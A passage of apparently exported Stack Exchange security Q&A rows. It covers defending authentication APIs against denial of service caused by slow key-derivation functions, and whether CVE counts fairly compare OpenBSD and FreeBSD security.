<p>If you want your backend to be stateless, things get more complicated.  One option, if you can arrange your backend to have access to a secret encryption key, is to use something like a JWE token <a href=""https://datatracker.ietf.org/doc/html/rfc7518#section-4.5"" rel=""noreferrer"">directly encrypted</a> with the secret key (using an authenticated encryption algorithm — but fortunately all the <a href=""https://datatracker.ietf.org/doc/html/rfc7518#section-5.1"" rel=""noreferrer"">encryption algorithms</a> supported by JWE are authenticated!) and containing any information the backend needs for fast authentication.  Depending on what you're doing in the backend, that might include one or more keys derived from the KDF output, but for applications that don't need to do any per-user encryption or decryption on the server, even just the ID of the authenticated account may be sufficient.</p>
<p>Now, obviously, just restricting slow key derivation to a single endpoint won't prevent that endpoint from being DoSed.  But it does reduce the server load from key derivation in <em>normal</em> usage, and it also paves the way for further DoS countermeasures, such as:</p>
</li>
<li><p><strong>Rate limit your authentication endpoint.</strong>  With appropriate rate limits in place, a DoS attack on your authentication endpoint should <em>only</em> be able to deny access to that endpoint, but not interfere with clients that have already authenticated.  While that's still not ideal, it's a significant improvement, especially if you allow your clients to establish fairly long-lived sessions (say, 1 day).</p>
<p>For some simple types of DoS attacks, finer-grained rate limiting based on e.g. source IP address can be even more effective than just a single global rate limit.  Yes, distributed attacks e.g. via botnets can circumvent such rate limiting, but the <em>reason</em> why server-side KDFs can be tempting DoS targets in the first place is because they can allow easy DoS <em>without</em> the massive bandwidth of a botnet.  If your attacker has a botnet, they probably don't need to target your KDF.</p>
</li>
<li><p>If you cannot or don't want to implement explicit rate limiting, a &quot;soft&quot; alternative can be to <strong>run your authentication endpoint on a separate server</strong>, or at least in a separate resource-limited container.  This also prevents a DoS attack on the authentication code from taking down the rest of the service.  Of course, for this to work, the authentication server and the rest of the endpoints need to share access to the same session storage, and/or to the same token encryption keys.</p>
</li>
<li><p>As noted in <a href=""https://security.stackexchange.com/a/257285"">ThoriumBR's answer</a>, you could also require the client to submit a <strong>proof of work</strong> as part of the authentication request.  Essentially, this forces the client to spend as much effort on the request as the server will spend on computing the KDF, or at least some reasonable fraction thereof, thus eliminating or reducing the attacker's leverage.  However, I would not actually recommend this approach, since if you can do this, there's an even better alternative:</p>
</li>
<li><p>IMO the absolute best way to avoid DoS via slow KDFs is to <strong>offload the slow key derivation to the client</strong>.  Basically, instead of having the client send a passphrase to the server, which then uses a slow KDF (such as PBKDF2 or Argon2, etc.) to derive a pseudorandom master key from it, just have the client run the slow KDF and send its output as part of the request.</p>
<p>This does require somehow ensuring that the client knows which salt, iteration count and other KDF parameters it needs to use.  Probably the easiest way to handle this is simply to have the client request these parameters from the server in a separate request.  For most parameters this is no problem (although the client should definitely at least enforce a minimum iteration count!), but the salt does require some extra consideration:</p>
<ul>
<li>If you don't want your pre-authentication endpoint to disclose which user IDs exist on your system, you'll have to generate fake salts for nonexistent usernames, e.g. by hashing the username together with a server-side secret.  (Of course, preventing the leakage of user IDs is not always either desirable or practical anyway.)</li>
<li>In any case, you'll leak the user's salt, which means that an attacker may observer any changes to it.  If you follow the standard procedure of changing the salt whenever the user changes their passphrase, this can allow an attacker to both confirm that a user ID exists (assuming your fake salts don't change) and that the user has (or has not) changed their passphrase since the attacker's last query.  In general, this leak seems more or less unavoidable, except by using a fixed salt for each user (which has its own issues).</li>
<li>You may also want to have the client <em>augment the salt</em> sent by the server e.g. by appending the user ID and possibly some server- or application-specific string to it.  This is to prevent a MiTM attacker from tricking the client into using a salt and KDF parameters belonging to the same user on another service, which <em>could</em> be an issue if the user used the same passphrase for both services.</li>
</ul>
<p>Also, you'll probably still want to run the KDF output sent by the client through a second KDF on the server — but this second KDF can be a fast KBKDF such as <a href=""https://en.wikipedia.org/wiki/HKDF"" rel=""noreferrer"">HKDF</a> (<a href=""https://datatracker.ietf.org/doc/html/rfc5869"" rel=""noreferrer"">RFC 5869</a>).  Depending on your application, this may not be strictly required, but it doesn't hurt and can have various advantages.  In particular:</p>
<ul>
<li>it allows you to derive multiple subkeys and/or check values of any desired length from the KDF output, without the client needing to be aware of this;</li>
<li>if you're using (part of) the KDF output for user authentication, by comparing it with a &quot;password hash&quot; string stored in your user database, having a server-side KDF step prevents an attacker who compromises your database from using the stored hash directly to authenticate;</li>
<li>it protects you against potential attacks using malformed input by ensuring that, whatever the client sends you, it goes through HKDF before it touches any other cryptographic code on your server.</li>
</ul>
</li>
</ol>
","7"
"257283","257283","Do Key-Derivation Functions pose a Denial-of-Service Threat for APIs?","<p>Imagine a simple API, which offers an endpoint <code>POST /account/authenticate</code>, which takes a username and password, then returns a JWT on success and an error on failure. In the backend, the endpoint uses some key-derivation function like Argon2 or PBKDF2, with the parameters tuned to be difficult to crack.</p>
<p>Wouldn't such an endpoint allow a very simple resource exhaustion attack? An attacker can cause a high workload on the server without having to do a lot of work themselves. Depending on how the KDF is configured, many parallel requests can consume large amounts of server memory.</p>
<p>Is this actually an issue? And if so, how can this be mitigated? Since this is an API, typical front-end measures like CAPTCHA are not possible.</p>
","5","4","257319","<p>Your endpoint presumably checks that the username exists in your account database (an inexpensive check) before proceeding with the more expensive key derivation function.  Presumably your attacker does not know a large number of usernames to hammer away at your endpoint with.  So, you should be able to mitigate this type of attack to some degree by rate-limiting the number of attempts per username.</p>
","1"
"257230","257230","Would FreeBSD and OpenBSD have similar known-past-vulnerability stats if they were configured similarly?","<p>OpenBSD has had much fewer &quot;code execution&quot; vulnerabilities and even fewer exploits than FreeBSD, according to <a href=""https://cvedetails.com"" rel=""nofollow noreferrer"">https://cvedetails.com</a> :</p>
<ul>
<li><a href=""https://www.cvedetails.com/product/163/Openbsd-Openbsd.html?vendor_id=97"" rel=""nofollow noreferrer"">https://www.cvedetails.com/product/163/Openbsd-Openbsd.html?vendor_id=97</a></li>
<li><a href=""https://www.cvedetails.com/product/7/Freebsd-Freebsd.html?vendor_id=6"" rel=""nofollow noreferrer"">https://www.cvedetails.com/product/7/Freebsd-Freebsd.html?vendor_id=6</a></li>
</ul>
<p>However, I wonder if this is an apples-to-apples comparison, given that OpenBSD disables or doesn't support some features that are enabled in FreeBSD by default.</p>
<p>In practice, you'll probably use SMP. You can also use UFS2 instead of ZFS (which is complex) in FreeBSD. You could presumably configure other options to be similar. <strong>Would that make FreeBSD as apparently secure as OpenBSD (according to their history of past vulnerabilities and exploits)?</strong></p>
<hr />
<p><em>Edit:</em> Emphasized the actual question. People seem to be answering the title, which is shorter, but more likely to be misunderstood.</p>
<p><em>Edit2:</em> Changed the title to prevent misunderstanding.</p>
","0","3","257236","<p>The original question which is answered here was</p>
<blockquote>
<p>Can CVE stats be used to compare the security of OpenBSD and FreeBSD?</p>
</blockquote>
<p>Just comparing the CVE is not a reliably way to compare the security of systems. While they are kind of an indicator of the attack surface of a platform, they also indicate how many people actually look at the security of the platform to find bugs and how issues are communicated. Not all issues necessarily get a CVE.</p>
<p>It would be better to look deeper into the details of the OS, i.e. the focus of the development (performance vs. security), the manpower and expertise of the developers regarding security, the kind of issues which might indicate a lack of quality control in critical areas, the design choices for OS and software in terms of robustness even when bugs happen (like heavy use of privilege separation and sandboxing) and more.</p>
<blockquote>
<p>...  given that OpenBSD disables or doesn't support some features that are enabled in FreeBSD by default.</p>
</blockquote>
<p>Even that might be a deliberate design choice, i.e. to proactively limit the attack surface of the platform. It might also be a lack of development resources though. Thus, a closer look why these choices were made is needed too, instead of just counting features.</p>
","3"
"257230","257230","Would FreeBSD and OpenBSD have similar known-past-vulnerability stats if they were configured similarly?","<p>OpenBSD has had much fewer &quot;code execution&quot; vulnerabilities and even fewer exploits than FreeBSD, according to <a href=""https://cvedetails.com"" rel=""nofollow noreferrer"">https://cvedetails.com</a> :</p>
<ul>
<li><a href=""https://www.cvedetails.com/product/163/Openbsd-Openbsd.html?vendor_id=97"" rel=""nofollow noreferrer"">https://www.cvedetails.com/product/163/Openbsd-Openbsd.html?vendor_id=97</a></li>
<li><a href=""https://www.cvedetails.com/product/7/Freebsd-Freebsd.html?vendor_id=6"" rel=""nofollow noreferrer"">https://www.cvedetails.com/product/7/Freebsd-Freebsd.html?vendor_id=6</a></li>
</ul>
<p>However, I wonder if this is an apples-to-apples comparison, given that OpenBSD disables or doesn't support some features that are enabled in FreeBSD by default.</p>
<p>In practice, you'll probably use SMP. You can also use UFS2 instead of ZFS (which is complex) in FreeBSD. You could presumably configure other options to be similar. <strong>Would that make FreeBSD as apparently secure as OpenBSD (according to their history of past vulnerabilities and exploits)?</strong></p>
<hr />
<p><em>Edit:</em> Emphasized the actual question. People seem to be answering the title, which is shorter, but more likely to be misunderstood.</p>
<p><em>Edit2:</em> Changed the title to prevent misunderstanding.</p>
","0","3","257243","<p>CVEs are important but I think the question also refers to flaws, and project's ability to respond to them. Indeed, during any security assessment a company could encounter flaws. Later being referenced as CVEs.</p>
<p>Project's member can easily ignore working on a report of a flaw found by a legit person online (or even during any security audit performed from another company) because they have other work priorities too. (It's like solving a challenge when you have another mission assigned to you.)
This applies to companies too. The one I work for evaluate the risk and if it is evaluated being low, the fix is not a priority. When browsing a project's CVE page list you can observe many are considered low or medium risk.</p>
<p>Although both the OpenBSD and FreeBSD projects are not companies per say, they suffer from the same syndrome: Overwhelming.
The only difference is &quot;how overwhelmed you are&quot;.</p>
<p>Comparing both projects sizes and responsibilities, we can assume FreeBSD's one might be prone to overwhelming. Or at least, easier overwhelmed than OpenBSD.
But, if they are not overwhelmed they can allow themselves to fix and patch quickly any flaw reported, no matter if it's a low or very low risk.</p>
<p>Both have different Security policies. Yes OpenBSD is the more secure one could afford... yet. But I don't know if they could handle as much market share as FreeBSD.</p>
<p>Now, let's compare both OpenBSD's and FreeBSD's policies.
<strong>FreeBSD</strong> <strong>has</strong> a very strict and rigorous security policy involving many <strong>intermediate levels</strong> from when the <strong>flaw is discovered or reported and then disclosed</strong>.
<strong>While OpenBSD find bugs and fixes them.</strong>
On one hand, OpenBSD security team members are ahead of the flaw. Because they detect any bug and fix it no matter if the bug could be a potential vulnerability or not. On the other hand, FreeBSD security team members put all their effort in fixing and patching, without hesitating contacting (or requesting) external experts to the FreeBSD's project.</p>
<p>Answering your question, I do think CVE stats can be used to compare the security of OpenBSD and FreeBSD. Basing yourself on the CVE stats helps you choose between two products. OpenBSD offers a dedicated security team member fixing bugs one by one and FreeBSD proposes a security team working on fixing flaws. <strong>You can then choose if you want a project with fewer people working intensively on preventing flaws or a project with more people working intensively on fixing flaws.</strong> Both security policies are good (IMO) and the number of CVE demonstrate FreeBSD's security team capacity to provide response. But the number of CVE for OpenBSD indicates project's security team's workflow is doing great.</p>
<p>To me, comparing both OpenBSD's and FreeBSD's CVE list raises a question: &quot;Which one do you bet on?&quot;.</p>
<p>I have seen many people choosing OpenBSD over FreeBSD because &quot;they have fewer CVEs assigned&quot;. Without understanding how it's security policy works.
Many users ignore <strong>why</strong> OpenBSD's project has fewer CVEs.
But many choose to ignore that FreeBSD can be hardened the way you want.</p>
<p><em>According you only choose an Operating System based on the security policy. I know, one should not choose any OS just based on one argument but many think the opposite way.</em></p>
<p><em>CVEs are the result of a flaw report and a sometimes a disclosed fix, but the flaw can be frozen by a company too.</em> <em>(Leading the flaw to be known to little and some consumers are alerted before others, so the information security professionals from those companies could help fixing it prior any public disclosure)</em></p>
","1"